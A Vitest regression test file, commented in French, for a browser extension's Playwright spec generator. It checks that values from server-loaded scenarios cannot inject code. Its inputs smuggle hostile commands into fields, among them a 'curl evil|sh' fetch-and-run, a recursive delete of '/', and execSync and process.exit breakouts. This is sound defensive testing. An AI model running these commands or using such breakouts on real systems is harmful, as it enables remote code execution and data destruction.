import { describe, it, expect, beforeAll } from 'vitest'
import { readFileSync } from 'node:fs'
import { resolve, dirname } from 'node:path'
import { fileURLToPath } from 'node:url'

// F12 — le générateur de spec Playwright de l'extension interpolait `x`, `y` et
// `ms` dans des positions *non entourées de guillemets* : `_escJs` ne peut rien
// y faire, il ne protège que l'intérieur d'un littéral. Une valeur non
// numérique venue d'un scénario chargé depuis le serveur — donc potentiellement
// écrit par quelqu'un d'autre — devenait du code exécuté sur la machine de
// celui qui lance le fichier téléchargé.
//
// `background.js` est un service worker classique (pas un module ESM) : il n'a
// rien à exporter. On évalue donc la source dans un bac à sable, avec un `chrome`
// factice pour les deux `addListener` de premier niveau, et on récupère les
// fonctions déclarées. C'est ce qui permet de tester le vrai fichier livré
// plutôt qu'une copie qui divergerait.

const __dirname = dirname(fileURLToPath(import.meta.url))
const SOURCE = resolve(__dirname, '../../extension/background.js')

let _generatePlaywright

beforeAll(() => {
  const src = readFileSync(SOURCE, 'utf8')
  const chromeStub = {
    runtime: { onMessage: { addListener() {} } },
    tabs: { onUpdated: { addListener() {} }, sendMessage: () => Promise.resolve() },
    storage: { local: { get: () => Promise.resolve({}), set: () => Promise.resolve() } },
    scripting: { executeScript: () => Promise.resolve() },
  }
  const load = new Function('chrome', `${src}\nreturn { _generatePlaywright, _escJs };`)
  ;({ _generatePlaywright } = load(chromeStub))
})

const spec = (steps) => _generatePlaywright(steps)

describe('extension — génération de spec Playwright', () => {
  it('n’émet que des littéraux numériques pour un scroll', () => {
    const code = spec([
      {
        type: 'scroll',
        params: { x: "0);require('child_process').execSync('curl evil|sh');(0", y: 42 },
      },
    ])

    expect(code).not.toContain('child_process')
    expect(code).toContain('window.scrollTo(0, 42)')
  })

  it('n’émet que des littéraux numériques pour une attente', () => {
    const code = spec([
      { type: 'wait_time', params: { ms: "1000);require('fs').rmSync('/', {recursive:true});(" } },
    ])

    expect(code).not.toContain("require('fs')")
    expect(code).toContain('await page.waitForTimeout(1000);')
  })

  it('conserve les valeurs numériques légitimes, y compris passées en chaîne', () => {
    const code = spec([
      { type: 'scroll', params: { x: '120', y: -30 } },
      { type: 'wait_time', params: { ms: 250 } },
    ])

    expect(code).toContain('window.scrollTo(120, -30)')
    expect(code).toContain('await page.waitForTimeout(250);')
  })

  it('retombe sur les valeurs par défaut quand le param est absent ou vide', () => {
    const code = spec([{ type: 'scroll', params: {} }, { type: 'wait_time', params: {} }])

    expect(code).toContain('window.scrollTo(0, 0)')
    expect(code).toContain('await page.waitForTimeout(1000);')
  })

  it('garde un type de step inconnu à l’intérieur de son commentaire', () => {
    const code = spec([{ type: "oops\nrequire('child_process').execSync('id')" }])

    expect(code).not.toMatch(/^\s*require\(/m)
    expect(code).toContain('// Unknown step type:')
  })

  it('échappe les sauts de ligne dans les valeurs entre apostrophes', () => {
    const code = spec([{ type: 'fill', params: { selector: '#a', value: "x\n');alert(1);//" } }])

    // La valeur reste un littéral d'une seule ligne : rien n'en sort.
    expect(code).toContain('\\n')
    expect(code.split('\n').filter((l) => l.includes('alert(1)'))).toHaveLength(1)
    expect(code).toContain("await page.fill('#a',")
  })

  it('échappe toujours les apostrophes des sélecteurs', () => {
    const code = spec([{ type: 'click', params: { selector: "a'); process.exit(1); ('" } }])

    // La charge reste inerte : chaque apostrophe est échappée, donc la valeur
    // ne referme jamais le littéral qui la contient.
    expect(code).toContain("await page.click('a\\'); process.exit(1); (\\'');")
  })
})
